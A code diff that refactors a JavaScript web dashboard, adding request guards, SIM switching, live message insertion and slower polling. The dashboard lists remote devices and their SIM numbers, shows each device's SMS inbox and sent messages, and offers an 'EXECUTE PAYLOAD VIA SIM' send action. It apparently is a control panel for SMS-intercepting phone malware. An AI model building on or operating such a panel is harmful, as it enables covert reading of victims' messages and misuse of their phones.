@@ -1868,28 +1868,15 @@ async function proxyFirebase(src, id, path, method = 'PUT', payload = null) {
     return fetch(`/api/execute/${src}/${id}`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` }, body: JSON.stringify({ path, payload, method }) });
 }
 
-async function fetchAll(isBg = false) {
-    const l = document.getElementById('loader');
-    if (!isBg) {
-        document.getElementById('devList').innerHTML = renderSkeletons();
-        document.getElementById('devCount').textContent = 'DEVICES (···)';
-        
-        document.getElementById('hTotal').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
-        document.getElementById('hOnline').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
-        document.getElementById('hOffline').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
-        const ratioEl = document.getElementById('hRatio');
-        if(ratioEl) ratioEl.innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:10px;border-radius:4px;"></span>';
-        const barEl = document.getElementById('hProgressBar');
-        if(barEl) { barEl.style.width = '100%'; barEl.style.background = 'rgba(255,255,255,0.05)'; barEl.style.boxShadow = 'none'; }
-        
-        if (curTab === 'overview') {
-            document.getElementById('pane').innerHTML = renderMainSkeletons();
-        }
-    }
-    
-    let newDevices = [];
+let _fetchAllInFlight = false;
 
+async function fetchAll(isBg = false) {
+    if (_fetchAllInFlight && isBg) return;
+    _fetchAllInFlight = true;
     try {
+        let newDevices = [];
+
+        try {
         const dbRes = await fetch(`/api/databases?t=${Date.now()}`, {
             headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
         });
@@ -1997,6 +1984,9 @@ async function fetchAll(isBg = false) {
     } else {
         updateStats(); // Only update the topbar stats silently
         if (curTab === 'overview' && !document.getElementById('pane').innerHTML.trim()) renderTab(true); // Prevent 10-second background layout thrashing
+    }
+    } finally {
+        _fetchAllInFlight = false;
     }
 }
 
@@ -2578,11 +2568,11 @@ function renderTab(silent = false) {
                 <div class="form-sub">Device: <span style="color:var(--cyan);font-family:var(--font-mono);font-weight:700;">${esc(d._id)}</span></div>
                 
                 <div class="sim-grid">
-                    <div class="sim-card ${selSim===1?'active':''}" onclick="selSim=1;renderTab()">
+                    <div class="sim-card ${selSim===1?'active':''}" onclick="switchSim(1)">
                         <div class="sim-title">SIM 1</div>
                         <div class="sim-num">${esc(d.sims?.[0]?.phoneNumber||'Unknown')}</div>
                     </div>
-                    <div class="sim-card ${selSim===2?'active':''}" onclick="selSim=2;renderTab()">
+                    <div class="sim-card ${selSim===2?'active':''}" onclick="switchSim(2)">
                         <div class="sim-title">SIM 2</div>
                         <div class="sim-num">${esc(d.sims?.[1]?.phoneNumber||'Unknown')}</div>
                     </div>
@@ -2632,24 +2622,64 @@ function renderMList() {
         return tA - tB;
     });
 
-    const html = [...msgs].reverse().slice(0,200).map(m => {
-        const isOut = m.type === 'outgoing';
-        return `
-        <div class="chat-msg">
-            <div class="chat-head">
-                <div class="chat-sender">${esc(m.sender||m.address||m.number||'Unknown')}</div>
-                <div class="chat-badge ${isOut?'out':'in'}">${isOut?'SENT':'INBOX'}</div>
-                <div class="chat-time">${esc(m.dateTime||m.date||'')}</div>
-                <div class="chat-delete" onclick="promptDeleteMsg('${m._localId}')" style="margin-left:auto; width:24px; height:24px; border-radius:4px; display:flex; align-items:center; justify-content:center; color:rgba(255,255,255,0.3); cursor:pointer; background:rgba(255,255,255,0.05); font-size:0.8rem; transition:var(--trans);" onmouseover="this.style.background='rgba(239, 68, 68, 0.2)'; this.style.color='var(--red)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'; this.style.color='rgba(255,255,255,0.3)'">✕</div>
-            </div>
-            <div class="chat-body">${esc(m.message||m.body||m.text||'')}</div>
-        </div>`;
-    }).join('');
+function renderSingleMsgHtml(m) {
+    const isOut = m.type === 'outgoing';
+    return `
+    <div class="chat-msg">
+        <div class="chat-head">
+            <div class="chat-sender">${esc(m.sender||m.address||m.number||'Unknown')}</div>
+            <div class="chat-badge ${isOut?'out':'in'}">${isOut?'SENT':'INBOX'}</div>
+            <div class="chat-time">${esc(m.dateTime||m.date||'')}</div>
+            <div class="chat-delete" onclick="promptDeleteMsg('${m._localId}')" style="margin-left:auto; width:24px; height:24px; border-radius:4px; display:flex; align-items:center; justify-content:center; color:rgba(255,255,255,0.3); cursor:pointer; background:rgba(255,255,255,0.05); font-size:0.8rem; transition:var(--trans);" onmouseover="this.style.background='rgba(239, 68, 68, 0.2)'; this.style.color='var(--red)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'; this.style.color='rgba(255,255,255,0.3)'">✕</div>
+        </div>
+        <div class="chat-body">${esc(m.message||m.body||m.text||'')}</div>
+    </div>`;
+}
+
+function renderMList() {
+    const d = selDev;
+    if (!d || !d._id) return;
+    const k = d._id.toLowerCase();
+    let allDevMsgs = cache[k] || [];
+    
+    // Update badge count live
+    const badge = document.querySelector('.mhb-badge');
+    if (badge) {
+        badge.textContent = `${allDevMsgs.length} MSGS`;
+    }
+
+    let msgs = [...allDevMsgs];
+    const q = (document.getElementById('mSearch')?.value||'').toLowerCase();
+    
+    if(mf==='in') msgs = msgs.filter(m => !m.type || m.type === 'incoming');
+    if(mf==='out') msgs = msgs.filter(m => m.type === 'outgoing');
+    if(q) msgs = msgs.filter(m => `${m.sender||''} ${m.message||''}`.toLowerCase().includes(q));
+
+    // Sort ascending by ID / timestamp so newest is guaranteed to be at the end before reverse
+    msgs.sort((a, b) => {
+        const rawA = a.timestamp || a.id || 0;
+        const rawB = b.timestamp || b.id || 0;
+        const tA = (typeof rawA === 'number' ? rawA : parseFloat(rawA)) || 0;
+        const tB = (typeof rawB === 'number' ? rawB : parseFloat(rawB)) || 0;
+        return tA - tB;
+    });
+
+    const html = [...msgs].reverse().slice(0,200).map(m => renderSingleMsgHtml(m)).join('');
     
     const mListEl = document.getElementById('mList');
     if (mListEl) {
         mListEl.innerHTML = html || emp('No messages match criteria');
     }
+}
+
+function switchSim(n) {
+    selSim = n;
+    document.querySelectorAll('.sim-card').forEach((el, idx) => {
+        if (idx === n - 1) el.classList.add('active');
+        else el.classList.remove('active');
+    });
+    const btn = document.querySelector('.btn-send');
+    if (btn) btn.textContent = `EXECUTE PAYLOAD VIA SIM ${n}`;
 }
 
 async function execSMS() {
@@ -4468,10 +4498,14 @@ async function toggleUserPerm(userId, permission, isChecked) {
 
 window.adminUsers = []; // global cache for edit operations
 
+let _isFetchingUsers = false;
+
 async function renderAdminUserList(isBg = false) {
+    if (_isFetchingUsers && isBg) return;
     const list = document.getElementById('adminUserList');
     if (!list) return;
     
+    _isFetchingUsers = true;
     try {
         const res = await fetch(`/api/admin/users?t=${Date.now()}`, { 
             headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` },
@@ -4481,10 +4515,17 @@ async function renderAdminUserList(isBg = false) {
         
         if (data.success) {
             const userArray = data.users || data.data || [];
+            const newHash = JSON.stringify(userArray);
+            if (isBg && window._lastUserArrayHash === newHash) {
+                _isFetchingUsers = false;
+                return;
+            }
+            window._lastUserArrayHash = newHash;
             window.adminUsers = userArray; // Store globally
             
             if (userArray.length === 0) {
                 list.innerHTML = '<div style="padding: 32px; text-align: center; color: var(--text-sec);">No users found.</div>';
+                _isFetchingUsers = false;
                 return;
             }
             
@@ -4577,10 +4618,11 @@ async function renderAdminUserList(isBg = false) {
                     }
                 }
             }
-        }
     } catch (e) {
         console.error(e);
         list.innerHTML = '<div style="padding: 32px; text-align: center; color: var(--red);">Error loading users.</div>';
+    } finally {
+        _isFetchingUsers = false;
     }
 }
 
@@ -4865,11 +4907,19 @@ function openAddDbDrawer() {
                 }
             }
             
-            // Unconditional live UI re-render whenever selected device matches target
-            if (selDev && selDev._id.toLowerCase() === targetDevId) {
-                renderMList();
-            } else if (curTab === 'messages') {
-                renderMList();
+            // Surgical live UI insertion whenever selected device matches target
+            if ((selDev && selDev._id.toLowerCase() === targetDevId) || curTab === 'messages') {
+                const mListEl = document.getElementById('mList');
+                const q = (document.getElementById('mSearch')?.value||'').toLowerCase();
+                const isFiltered = q || (mf !== 'all');
+                if (mListEl && !isFiltered) {
+                    const badge = document.querySelector('.mhb-badge');
+                    if (badge && cache[targetDevId]) badge.textContent = `${cache[targetDevId].length} MSGS`;
+                    if (mListEl.querySelector('.empty-state')) mListEl.innerHTML = '';
+                    mListEl.insertAdjacentHTML('afterbegin', renderSingleMsgHtml(formattedMsg));
+                } else {
+                    renderMList();
+                }
             }
         });
         // --- ANALYTICS & TELEMETRY ENGINE ---
@@ -4926,7 +4976,11 @@ function openAddDbDrawer() {
             document.getElementById('btnAdminWaveHist').style.color = mode === 'historical' ? 'var(--cyan)' : 'var(--text-muted)';
         };
 
+        let _telemetryInFlight = false;
+
         async function pollTelemetry() {
+            if (_telemetryInFlight || document.hidden) return;
+            _telemetryInFlight = true;
             try {
                 // Determine visibility
                 const mainWs = document.getElementById('mainWorkspace');
@@ -4983,11 +5037,13 @@ function openAddDbDrawer() {
                 }
             } catch (e) {
                 console.warn('Telemetry poll error', e);
+            } finally {
+                _telemetryInFlight = false;
             }
         }
 
         // Add to global polling loop instead of creating a new fast interval that might get blocked
-        setInterval(pollTelemetry, 1000); 
+        setInterval(pollTelemetry, 3000); 
 
         // Make sure to call initCharts when Overview is loaded
         const originalSwitchTab = window.switchTab;
